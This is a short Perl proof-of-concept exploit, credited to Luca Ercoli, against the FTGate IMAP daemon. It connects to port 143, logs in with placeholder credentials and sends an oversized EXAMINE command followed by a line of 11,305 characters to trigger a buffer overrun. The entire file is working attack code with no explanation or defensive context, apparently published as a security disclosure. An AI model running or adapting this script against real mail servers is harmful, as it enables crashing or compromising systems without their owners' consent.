#!/usr/bin/perl

use IO::Socket;

print "\nFTGate Imapd BufferOverrun\nLuca Ercoli io\@lucaercoli.it\n";
print "http://www.lucaercoli.it\n\n\n";

$host = "localhost";

$remote = IO::Socket::INET->new ( Proto => "tcp",
PeerAddr => $host,
PeerPort => "143",
);

unless ($remote) { die "Can't connect to $host" }

print "[!] Connected\n";
print "[?] Exploiting...\n";

sleep(1);

my $imapd = join ("", "1 login user pass", "\r\n");

print $remote $imapd;

sleep(1);
my $imapd = join ("", "1 EXAMINE ", "B"x(224), "\r\n");
print $remote $imapd;
sleep(1);
my $imapd = join ("","C"x(11305), "\r\n");
print $remote $imapd;

print "\n[!] Done\n\n\n";

close $remote;
